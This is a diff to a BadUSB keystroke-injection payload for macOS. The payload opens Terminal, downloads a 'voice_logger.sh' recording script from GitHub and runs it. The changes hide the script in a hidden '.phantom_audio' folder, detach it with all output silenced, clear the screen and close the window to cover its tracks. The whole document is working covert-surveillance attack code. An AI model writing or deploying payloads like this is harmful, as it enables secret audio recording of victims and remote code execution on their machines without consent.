@@ -30,8 +30,11 @@ STRING Terminal
 DELAY 500
 ENTER
 DELAY 500
-STRING nohup curl -O 'https://raw.githubusercontent.com/YonKu0/BadUSB/main/Recon/MacOS/Voice%20Logger/voice_logger.sh' && chmod +x voice_logger.sh && ./voice_logger.sh &
+STRING mkdir -p ~/.phantom_audio && cd .phantom_audio && curl -O 'https://raw.githubusercontent.com/YonKu0/BadUSB/main/Recon/MacOS/Voice%20Logger/voice_logger.sh' && chmod +x voice_logger.sh && nohup ./voice_logger.sh >/dev/null 2>&1 & disown
 DELAY 1000
 ENTER
+STRING clear
 DELAY 500
+ENTER
+DELAY 15000
 GUI w
